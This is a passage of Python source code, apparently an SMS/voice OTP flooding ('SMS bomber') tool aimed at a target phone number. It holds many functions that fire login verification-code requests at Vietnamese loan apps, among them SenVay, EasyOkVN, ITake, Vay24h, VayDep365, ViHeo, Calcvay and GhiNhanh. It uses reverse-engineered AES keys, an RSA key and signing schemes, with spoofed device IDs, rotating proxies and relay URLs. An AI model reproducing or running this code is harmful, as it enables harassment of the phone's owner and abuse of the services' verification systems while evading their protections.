    plain = unpad(AES.new(_VVAY_KEY, AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
    text = plain.decode("utf-8").strip()
    try:
        return json.loads(text)
    except Exception:
        return text


#  LT Generic (SenVay family) 
def _lt_rand_path() -> str:
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    return "/h5/" + "".join(random.choice(chars) for _ in range(32))


async def _lt_generic(
    phone: str, is_voice: bool, host: str, app_id: str, ua_token: str, version: str = "1.0.0_1.0.2"
) -> bool:
    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    device_id = uuid.uuid4().hex
    label = f"{ua_token} {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
    try:
        async with httpx.AsyncClient(timeout=15, proxy=_current_proxy()) as client:
            r = await client.post(
                f"https://{host}{gw_path}", headers=headers, content=body.encode()
            )
        ok = r.status_code == 200
        if ok:
            print(f"  [{label}] {phone}  {r.status_code} | {r.text[:80]}")
        else:
            print(f"  [{label}] {phone}  {r.status_code} | {r.text[:80]}")
        return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


#  SenVay 
async def Call_SenVay(phone):
    return await _lt_generic(phone, False, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")


async def Call_SenVay_Voice(phone):
    return await _lt_generic(phone, True, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")



#  EasyOkVN (ging _lt_generic ca SenVay/HappyGoo + thm bc operationRecord/save
#    kiu V88Dong, v sniff cho thy 2 domain ring: api.easyokvn.com (gi thng,
#    UA "24Bot/1 CFNetwork...") v h5.easyokvn.com (gateway path ngu nhin 32 k t,
#    UA Mozilla + hu t "easyok", ging ht _lt_rand_path()/_lt_generic) 
async def _easyok_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
    headers = {
        "appId": "38",
        "Accept": "*/*",
        "version": "1.0.4",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "platform": "2",
        "token": "",
        "deviceId": device_id,
        "User-Agent": "24Bot/1 CFNetwork/1568.200.51 Darwin/24.1.0",
        "Content-Type": "application/json",
    }
    body = {
        "operationCode": "app_start_new",
        "sessionId": session_id,
        "operationTime": str(int(time.time() * 1000)),
    }
    try:
        await client.post(
            "https://api.easyokvn.com/member/operationRecord/save", headers=headers, json=body
        )
    except Exception:
        pass


async def _easyok_generic(phone: str, is_voice: bool) -> bool:
    device_id = uuid.uuid4().hex
    host = "h5.easyokvn.com"
    app_id = "38"
    ua_token = "easyok"
    version = "1.0.4_1.1.4"
    path = "/login/requestVerifyCode"
    gw_path = _lt_rand_path()
    label = f"EasyOkVN {'Voice' if is_voice else 'SMS'}"
    headers = {
        "appId": app_id,
        "language": "vi-VN",
        "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) {ua_token}",
        "Referer": f"https://{host}/login",
        "fpPlatform": "2",
        "Origin": f"https://{host}",
        "real_path": path,
        "fpDeviceId": "",
        "version": version,
        "fingerPrint": "",
        "deviceId": device_id,
        "platform": "2",
        "token": "",
        "x_x_path": _vvay_encrypt(path),
        "loginPlatform": "APP",
        "marketToken": "",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "identity",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Connection": "keep-alive",
    }
    body = _vvay_encrypt({"phone": phone, "isVoice": is_voice, "h5": False})
    try:
        async with _make_client(timeout=20, proxy=_current_proxy()) as client:
            await _easyok_operation_record_save(client, device_id)
            r = await client.post(f"https://{host}{gw_path}", headers=headers, content=body.encode())
        return r.status_code == 200
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
    return False


async def Call_EasyOkVN(phone):
    return await _easyok_generic(phone, is_voice=False)


async def Call_EasyOkVN_Voice(phone):
    return await _easyok_generic(phone, is_voice=True)


_ITAKE_HOST       = "http://h5.6itake-moment.com"
_ITAKE_GW_PATH    = None  # generated fresh per call; was stale static path causing 401
_ITAKE_REAL       = "/login/requestVerifyCode"
_ITAKE_CHECK_PATH = "/h5/urnyb540nnt7xuf08pcw93atdxvaiiv9"
_ITAKE_CHECK_REAL = "/login/checkPhoneNo"
# Key/IV ging VVay nhng phi dng compact JSON (khng indent)
_ITAKE_KEY = b"aajiaozicashmeh5"
_ITAKE_IV  = b"hajiaozicashmeh5"


def _itake_strip_chunked(text: str) -> str:
    lines = text.strip().splitlines()
    out = []
    for line in lines:
        s = line.strip()
        if s and len(s) <= 6 and all(c in "0123456789abcdefABCDEF" for c in s):
            continue
        out.append(s)
    return "".join(out)


def _itake_enc(obj) -> str:
    """AES-128-CBC encrypt vi compact JSON (khng indent/space quanh colon)."""
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False) if isinstance(obj, dict) else obj
    ct  = AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).encrypt(pad(raw.encode(), 16))
    return base64.b64encode(ct).decode()


def _itake_enc_path(path: str) -> str:
    p = path.split("?")[0].strip()
    if not p.startswith("/"): p = "/" + p
    ct = AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).encrypt(pad(p.encode(), 16))
    return base64.b64encode(ct).decode()


def _itake_dec(text: str):
    text = _itake_strip_chunked(text)
    try:
        ct = base64.b64decode(text)
        pt = unpad(AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).decrypt(ct), 16)
        decoded = pt.decode("utf-8", errors="replace").strip()
        try:
            return json.loads(decoded)
        except Exception:
            return decoded
    except Exception:
        return text


def _itake_hdrs(real_path: str) -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json",
        "Accept-Encoding": "identity",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/18.1 Mobile/15E148 Safari/604.1"
        ),
        "appId": "20", "version": "1.0.0_4.0.4", "platform": "2",
        "loginPlatform": "H5", "fpPlatform": "5", "language": "vi-VN",
        "x_x_path":    _itake_enc_path(real_path),
        "fingerPrint": "", "fpDeviceId": "", "deviceId": "",
        "token": "", "marketToken": "", "country": "",
        "Referer": f"{_ITAKE_HOST}/login",
        "Origin": "http://h5.6itake-moment.com/home/loan/apply",
    }


async def Call_ITake(phone: str) -> bool:
    device_id = hashlib.md5(f"itake_{phone}".encode()).hexdigest()
    try:
        proxy = _current_proxy()
        # Bootstrap + OTP i qua CNG proxy/IP  server track session theo IP
        async with httpx.AsyncClient(
            timeout=40, follow_redirects=True, proxy=proxy
        ) as client:
            # 1. Bootstrap session
            await client.get(
                f"{_ITAKE_HOST}/login",
                headers={"User-Agent": _itake_hdrs(_ITAKE_REAL)["User-Agent"],
                         "Accept": "text/html,application/xhtml+xml,*/*",
                         "Accept-Encoding": "identity",
                         "Accept-Language": "vi-VN,vi;q=0.9"},
            )
            # 2. Voice (SMS b tt trn server)
            payload = _itake_enc({
                "phone": phone, "isVoice": False,
                "h5": False, "deviceId": device_id,
            })
            gw_path = "/h5/" + uuid.uuid4().hex
            r = await client.post(
                f"{_ITAKE_HOST}{gw_path}",
                headers=_itake_hdrs(_ITAKE_REAL),
                content=payload.encode(),
            )
            resp = _itake_dec(r.text)
            code = resp.get("code") if isinstance(resp, dict) else None
            ok   = code == 200 and resp.get("successful", False)
            if ok:
                print(f"  [ITake Voice] {phone}  {resp.get('msg') or 'OK'}")
                return True
            print(f"  [ITake Voice] code={code} msg={resp.get('msg') if isinstance(resp, dict) else resp}")
    except Exception as e:
        print(f"[ITake] ERR {type(e).__name__}: {e}")
    return False



#  H5 helpers (SaoThinhVuong, UVWallet, Vay24h family) 
_H5_TIMESTAMP = str(int(time.time() * 1000))
_H5_SIGN = hashlib.md5(_H5_TIMESTAMP.encode()).hexdigest()
_H5_IMEI = hashlib.md5(str(random.random()).encode()).hexdigest()
_H5_UA = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/18.1 Mobile/15E148 Safari/604.1"
)

def _h5_headers() -> dict:
    return {
        "Accept":           "application/json, text/plain, */*",
        "Content-Type":     "application/json;charset=utf-8",
        "Content-Language": "vn",
        "system":           "ios",
        "user-agent":       _H5_UA,
        "deviceType":       "h5",
        "w":                "1170",
        "h":                "2532",
        "appcodename":      "Mozilla",
        "appname":          "Netscape",
        "appversion":       _H5_UA,
        "platform":         "iPhone",
        "vendor":           "Apple Computer, Inc.",
        "screenresolution": "1170,2532",
    }

def _h5_body(phone: str, pkg_name: str, sms_type: int = 2) -> dict:
    return {
        "phone":       phone,
        "type":        sms_type,
        "timestamp":   int(time.time() * 1000),
        "referrer":    "utm_source=null",
        "af_prt":      None,
        "sign":        _H5_SIGN,
        "appversion":  "1.0.0",
        "channel":     "1",
        "trackerName": "H5",
        "app_version": "1.0.0",
        "version":     "1.0.0",
        "imei":        _H5_IMEI,
        "uuid":        _H5_IMEI,
        "pkg_name":    pkg_name,
    }

async def _h5_send(phone: str, base: str, pkg_name: str, label: str, sms_type: int = 2):
    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as c:
            r = await c.post(
                f"{base}/api/register/app/sendSms",
                headers=_h5_headers(),
                json=_h5_body(phone, pkg_name, sms_type),
            )
            d = r.json()
            if str(d.get("code", "")) == "200":
                print(f"  {label}")
            return r.status_code == 200
    except Exception:
        return False


async def saothinhvuong(phone: str):
    await _h5_send(phone, "https://h5.saothinhvuong.cc", "com.loan.starwarsh5ios", "SaoThinhVuong")

async def saothinhvuong_sms(phone: str):
    await _h5_send(phone, "https://h5.saothinhvuong.cc", "com.loan.starwarsh5ios", "SaoThinhVuong SMS", sms_type=1)

async def random_sao(phone):
    await random.choice([saothinhvuong, saothinhvuong_sms])(phone)




#  Vay24h 
_VAY24H_AES_KEY  = b"9mN4#kL2@xR7!pD6"
_VAY24H_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAY24H_AES_PKG  = "com.loan.uvwalleth5ios"
_VAY24H_AES_BASE = "https://h5.vay24h.vip"
_VAY24H_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vay24h.vip",
    "Referer": "https://h5.vay24h.vip/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vay24h_aes_enc(data: dict) -> str:
    ct = AES.new(_VAY24H_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()

def _vay24h_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAY24H_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAY24H_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_Vay24h(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    try:
        async with _make_client(timeout=30) as client:
            r1 = await client.post(
                f"{_VAY24H_AES_BASE}/api/comm/downoknotify",
                headers=_VAY24H_AES_HDRS,
                json={**_vay24h_common(imei), "type": 1},
            )
            d1 = {}
            try:
                d1 = r1.json()
            except Exception:
                pass
            if d1.get("code") not in ("200", 200):
                return False
            enc_data = _vay24h_aes_enc({
                "phone": phone, "type": "2",
                "pkg_name": _VAY24H_AES_PKG, "voice": "0", "reApply": "",
            })
            r2 = await client.post(
                f"{_VAY24H_AES_BASE}/api/register/h5/sendSms",
                headers=_VAY24H_AES_HDRS,
                json={"encryptedData": enc_data, "pkg_name": _VAY24H_AES_PKG},
            )
            try:
                d2 = r2.json()
                ok = str(d2.get("code", "")) in ("200", "0") or d2.get("code") in (200, 0)
            except Exception:
                ok = r2.status_code == 200
            return ok
    except Exception as e:
        print(f"[Vay24h] ERR {type(e).__name__}: {e}")
        return False


#  VayDep365 
_VAYDEP_AES_KEY  = b"8fA2#kD9!xL7@mN3"
_VAYDEP_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
_VAYDEP_AES_PKG  = "com.vch.vaychungh5ios"
_VAYDEP_AES_BASE = "https://h5.vaydep365.com"
_VAY_DEP365_URLS = [
    "https://ndnndfndndbb--28fa0824520211f1bae0ee650bb23af1.web.val.run",
    "https://wander6fb5.xadoa8.workers.dev/vaydep365",
    "https://verceldeploy-one-phi.vercel.app/api/vaydep",
]
_VAYDEP_AES_HDRS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Content-Language": "vn",
    "system": "ios", "deviceType": "h5", "w": "1170", "h": "2532",
    "appcodename": "Mozilla", "appname": "Netscape",
    "appversion": "5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "platform": "iPhone", "vendor": "Apple Computer, Inc.",
    "screenresolution": "1170,2532",
    "Origin": "https://h5.vaydep365.com",
    "Referer": "https://h5.vaydep365.com/login",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Accept-Encoding": "identity",
    "Connection": "keep-alive",
}


def _vaydep_aes_enc(data: dict) -> str:
    ct = AES.new(_VAYDEP_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _vaydep_aes_common(imei: str) -> dict:
    now = time.time()
    return {
        "timestamp": int(now),
        "nonce": "".join(random.choices(string.ascii_letters + string.digits, k=8)),
        "referrer": "utm_source=null",
        "af_prt": None,
        "sign": _VAYDEP_AES_SIGN,
        "appversion": "1.0.0",
        "channel": "1",
        "app_version": "1.0.0",
        "version": "1.0.0",
        "imei": imei,
        "uuid": imei,
        "pkg_name": _VAYDEP_AES_PKG,
        "download_time": f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now))}.000",
    }


async def Call_VayDep365(phone):
    imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            r1 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/comm/downoknotify",
                headers=_VAYDEP_AES_HDRS,
                json={**_vaydep_aes_common(imei), "type": 1},
            )
            d1 = {}
            try:
                d1 = r1.json()
            except Exception:
                pass
            if d1.get("code") not in ("200", 200):
                return False
            enc_data = _vaydep_aes_enc({
                "phone": phone, "type": "1",
                "pkg_name": _VAYDEP_AES_PKG, "voice": "0", "reApply": "",
            })
            r2 = await client.post(
                f"{_VAYDEP_AES_BASE}/api/register/h5/sendSms",
                headers=_VAYDEP_AES_HDRS,
                json={"encryptedData": enc_data, "pkg_name": _VAYDEP_AES_PKG},
            )
            return r2.status_code == 200
    except Exception as e:
        print(f"[VayDep365] ERR {type(e).__name__}: {e}")
        return False


#  UVWallet / SaoThinhVuong (cng pattern Vay24h-ECB) 


_MUAVAY_AES_KEY = b"IYFlUR+o0ec3uRlg2fhUzQ=="  # 24 bytes  AES-192


def _muavay_enc(data: dict) -> str:
    ct = AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).encrypt(
        pad(json.dumps(data, separators=(",", ":")).encode(), 16)
    )
    return base64.b64encode(ct).decode()


def _muavay_dec(b64_cipher: str) -> dict:
    try:
        raw = base64.b64decode(b64_cipher)
        pt = unpad(AES.new(_MUAVAY_AES_KEY, AES.MODE_ECB).decrypt(raw), 16)
        return json.loads(pt.decode())
    except Exception:
        return {}




_BANANA_RSA_PUB = RSA.import_key(
    "-----BEGIN PUBLIC KEY-----\n"
    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCf2LshP9miHsmcC4FtbGsOgwla\n"
    "MHHL3VLa8ervlaYY5/fw4yOYdsgnYqr7Wu+OfM2GWCnVFzpVjzxAuwpKPlMcMnUR\n"
    "NNhD9LwJN9eaGVX3A6OXpJjmPu3NmhSQB4Tdi7so/0Vb+WCFbsw1x6OO+Zs0+zm\n"
    "RS5WWL3JDfXYyxozA3QIDAQAB\n"
    "-----END PUBLIC KEY-----"
)


def _pkcs7_pad(data, bs=16):
    p = bs - len(data) % bs
    return data + bytes([p] * p)


def _banana_rnd_key() -> str:
    return "".join(
        random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=16)
    )

async def _banana_send(
    phone: str, url: str, loan_name: str, label: str, use_proxy: bool = True
) -> bool:
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    def _rsa_enc(k: str) -> str:
        return base64.b64encode(RSA_PKCS1.new(_BANANA_RSA_PUB).encrypt(k.encode())).decode()

    def _aes_enc(payload: dict, k: str) -> str:
        raw = json.dumps(payload, separators=(",", ":")).encode()
        ct = AES.new(k.encode(), AES.MODE_ECB).encrypt(_pkcs7_pad(raw))
        return base64.b64encode(ct).decode()

    def _hdrs(k: str) -> dict:
        return {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": origin, "Referer": origin + "/",
            "NEW_APP_ENC": _rsa_enc(k),
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        }

    event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"
    _client_kw: dict[str, Any] = dict(follow_redirects=True, )
    if use_proxy:
        _client_kw["proxy"] = _current_proxy()
    else:
        _client_kw["proxy"] = None
    try:
        async with _make_client(**_client_kw) as client:
            try:
                k1 = _banana_rnd_key()
                await client.post(
                    event_url, headers=_hdrs(k1),
                    json={"key": _aes_enc(
                        {"eventKey": "LOGIN_SMS", "packageName": loan_name, "phone": phone}, k1
                    )},
                    timeout=8,
                )
            except Exception:
                pass
            k2 = _banana_rnd_key()
            r = await client.post(
                url, headers=_hdrs(k2),
                json={"key": _aes_enc(
                    {"smsType": "1", "phone": phone, "loanProductName": loan_name}, k2
                )},
                timeout=20,
            )
        try:
            dec = AES.new(k2.encode(), AES.MODE_ECB).decrypt(base64.b64decode(r.json()["key"]))
            dec = json.loads(dec[: -dec[-1]])
            ok = bool(dec.get("ok") or str(dec.get("code", "")) in ("0", "1", "200"))
            msg = dec.get("message") or dec.get("msg") or ""
        except Exception:
            ok = r.status_code == 200
            msg = str(r.status_code)
        print(f"  [{label}] {'✓' if ok else '✗'} {phone}  {msg}")
        return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


_HEDGYV_API = "https://api.hedgyv.com"
_HEDGYV_H5  = "http://h5.hedgyv.com"

_HEDGYV_RSA_PUBKEY_B64 = (
    ""  # TODO: paste base64 public key (PKCS#8 hoc PKCS#1) ti y
)

_HEDGYV_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "language": "vi_VN",   # capital N  t nuttyv/hedgyv JS
    "appType": "1",
    "osType": "h5",        # JS: reactive({phone:"",smsCode:"",osType:"h5"})
    "client": "ios",       # t nuttyv H5 header pattern
    "Origin": _HEDGYV_H5,
    "Referer": _HEDGYV_H5 + "/",
    "User-Agent": "okhttp/4.9.0",
    "Accept-Encoding": "gzip",
}


def _hedgyv_rsa_encrypt(body_dict: dict) -> str:
    """
    Encrypt JSON body bng RSA public key ca hedgyv.
    Server Go dng rsa.DecryptPKCS1v15  decrypt field "key" trong body JSON.
    Format gi ln: {"key": "<base64_rsa_ciphertext>"}
    Output: base64 string ca RSA ciphertext ( wrap vo {"key": ...}).
    """
    raw_json = json.dumps(body_dict, separators=(",", ":"), ensure_ascii=False)
    key_der = base64.b64decode(_HEDGYV_RSA_PUBKEY_B64)
    pub_key = RSA.import_key(key_der)
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(raw_json.encode("utf-8"))
    return base64.b64encode(encrypted).decode()


async def Call_Hedgyv(phone: str) -> bool:
    if not _HEDGYV_RSA_PUBKEY_B64:
        print("[Hedgyv] SKIP  cha c RSA public key (ly t APK com.hedgyv.loan)")
        return False

    try:
        # SMS OTP body  t hedgyv JS: {smsType:"1", phone:k.phone, loanProductName:v}
        sms_enc = _hedgyv_rsa_encrypt({
            "smsType": "1",
            "phone": phone,
            "loanProductName": "hedgy",
        })
        # Burying event  t hedgyv JS: appBuryingPoint({type:1, productName:..., channelCode:...})
        burying_enc = _hedgyv_rsa_encrypt({
            "type": 1,
            "productName": "hedgy",
        })

        async with _make_client(follow_redirects=True, ) as client:
            try:
                await client.post(
                    f"{_HEDGYV_API}/burying/unauthenticated/event",
                    headers=_HEDGYV_HEADERS,
                    json={"key": burying_enc},
                    timeout=8,
                )
            except Exception:
                pass

            r = await client.post(
                f"{_HEDGYV_API}/user/sentSms",
                headers=_HEDGYV_HEADERS,
                json={"key": sms_enc},
                timeout=20,
            )

        print(f"[Hedgyv] {phone}  {r.status_code} | ")
        if r.status_code == 200:
            try:
                d = r.json()
                return d.get("code") == 1 or str(d.get("code", "")) in ("0", "200") or d.get("ok")
            except Exception:
                return True
        return False

    except Exception as e:
        print(f"[Hedgyv] ERR {type(e).__name__}: {e}")
        return False


async def sentSms1(phone):
    return await _banana_send(
        phone, "http://www.moneymua.top/app-domain/api/user/sentSms", "Money_Mua", "moneymua"
    )


async def sentSms_FvBanana(phone):
    return await _banana_send(
        phone, "https://www.fvbanana.top/app-domain/api/user/sentSms", "Fast_Vay", "fvbanana"
    )


async def Call_ViHeo(phone):
    """
    ViHeo H5 – sign formula giống GhiNhanh/Calcvay:
      sign = MD5(MD5(appCode) *|* secret *|* body_sorted *|* ts)
    """
    BASE     = "https://api.vi-heo.com"
    APP_CODE = "viheo"
    VERSION  = "none"

    h1 = {
        "Accept":       "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "platform":     "h5",
        "app-version":  VERSION,
        "lang":         "vi_VN",
    }

    def _yr(obj):
        if obj is None:
            return obj
        if isinstance(obj, list):
            return [_yr(x) for x in obj]
        if isinstance(obj, dict):
            return {k: _yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": APP_CODE, "mobileType": "2", "version": VERSION},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            if not secret:
                print(f"[ViHeo] Không lấy được secret: {d1}")
                return False

            body = {
                "appCode":    APP_CODE,
                "version":    VERSION,
                "mobileType": "2",
                "phone":      phone,
            }
            app_md5     = hashlib.md5(APP_CODE.encode()).hexdigest()
            ts          = int(time.time() * 1000)
            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
            sign = hashlib.md5(
                f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()
            ).hexdigest().lower()

            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
            )
            d2 = r2.json() if r2.status_code == 200 else {}
            ok = d2.get("code") == 200 or d2.get("data") is True
            if ok:
                print(f"  [ViHeo] ✓ {phone}")
            else:
                print(f"  [ViHeo] ✗ {phone}  {d2.get('message') or r2.status_code}")
            return ok
    except Exception as e:
        print(f"[ViHeo] ERR {type(e).__name__}: {e}")
        return False


async def sentSms_DuoVay(phone):
    """DuoVay – banana RSA+AES pattern, giống FvBanana/MoneyMua."""
    return await _banana_send(
        phone, "https://www.duovay.top/app-domain/api/user/sentSms", "Duoc_Vay", "duovay"
    )


async def Call_Calcvay(phone):
    """
    Calcvay H5 – sign formula giống GhiNhanh:
      sign = MD5(MD5(appCode) *|* secret *|* body_sorted *|* ts)
    Bước 1: GET secret từ /api/user/app/common/secret
    Bước 2: POST /api/user/app/login/sms với sign + timestamp
    """
    BASE     = "https://api.calcvay.com"
    APP_CODE = "calcvay"
    VERSION  = "none"

    h1 = {
        "Accept":       "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "platform":     "h5",
        "app-version":  VERSION,
        "lang":         "en",
    }

    def _yr(obj):
        if obj is None:
            return obj
        if isinstance(obj, list):
            return [_yr(x) for x in obj]
        if isinstance(obj, dict):
            return {k: _yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": APP_CODE, "mobileType": "2", "version": VERSION},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            if not secret:
                print(f"[Calcvay] Không lấy được secret: {d1}")
                return False

            body = {
                "appCode":    APP_CODE,
                "version":    VERSION,
                "mobileType": "2",
                "phone":      phone,
            }
            app_md5    = hashlib.md5(APP_CODE.encode()).hexdigest()
            ts         = int(time.time() * 1000)
            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
            sign = hashlib.md5(
                f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()
            ).hexdigest().lower()

            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
            )
            d2 = r2.json() if r2.status_code == 200 else {}
            ok = d2.get("code") == 200 or d2.get("data") is True
            if ok:
                print(f"  [Calcvay] ✓ {phone}")
            else:
                print(f"  [Calcvay] ✗ {phone}  {d2.get('message') or r2.status_code}")
            return ok
    except Exception as e:
        print(f"[Calcvay] ERR {type(e).__name__}: {e}")
        return False

async def Call_GhiNhanh_H5(phone):
    """GhiNhanh H5 platform (mobileType=1)  sign formula ging app nhng khc mobileType."""
    BASE = "https://api.ghinhanh.com"
    appcheck_tok = _load_appcheck_token("ghinhanh")
    h1 = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "platform": "h5", "app-version": "1.0.2", "lang": "vi_VN",
    }

    def _yr(obj):
        if obj is None: return obj
        if isinstance(obj, list): return [_yr(x) for x in obj]
        if isinstance(obj, dict): return {k: _yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": "ghinhanh", "mobileType": "1", "version": "1.0.2"},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            if not secret:
                return False
            body = {"appCode": "ghinhanh", "mobileType": "1", "phone": phone, "version": "1.0.2"}
            app_md5 = hashlib.md5(b"ghinhanh").hexdigest()
            ts = int(time.time() * 1000)
            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()).hexdigest().lower()
            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
            if appcheck_tok:
                post_hdrs["X-Firebase-AppCheck"] = appcheck_tok
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
            )
            d2 = r2.json() if r2.status_code == 200 else {}
            ok = d2.get("code") == 200 or d2.get("data") is True
            if ok:
                print(f"  [GhiNhanh-H5] {phone}")
            else:
                print(f"  [GhiNhanh-H5] {phone}  {d2.get('message') or r2.status_code}")
            return ok
    except Exception as e:
